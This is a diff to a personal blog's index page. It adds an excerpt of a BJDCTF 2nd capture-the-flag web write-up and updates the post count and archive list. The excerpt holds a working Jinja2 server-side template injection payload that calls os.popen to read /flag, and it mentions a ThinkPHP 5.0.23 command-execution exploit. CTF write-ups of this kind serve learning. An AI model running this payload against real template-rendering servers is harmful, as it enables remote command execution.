@@ -367,6 +367,40 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/article/99fa412f.html" >
+            
+                <span>BJDCTF2nd-Web Writeup</span>
+        </a>
+        <div class="abstract-content">
+            BJDCTF2nd-Web WriteupFake Google
+注释里提示是SSTI,稍微查一下就能理解.直接上payload
+1?name&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&#125;&#125;
+
+Old-HackThinkPHP的洞稍微测试一下,连版本号都出来了
+5.0.23是有命令执行的漏洞套网上的pay...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/23</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "WriteUP">WriteUP</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/article/a40c0fa6.html" >
             
                 <span>随机游程测试步骤</span>
@@ -931,9 +965,24 @@ height:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 31
+        Total : 32
         </div>
         <!-- search  -->
         
@@ -946,6 +995,11 @@ height:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "/article/e1670c78.html" >C#大作业的分析与实现</a>
+        </li>
     
     
         <li class="archive-post-item">
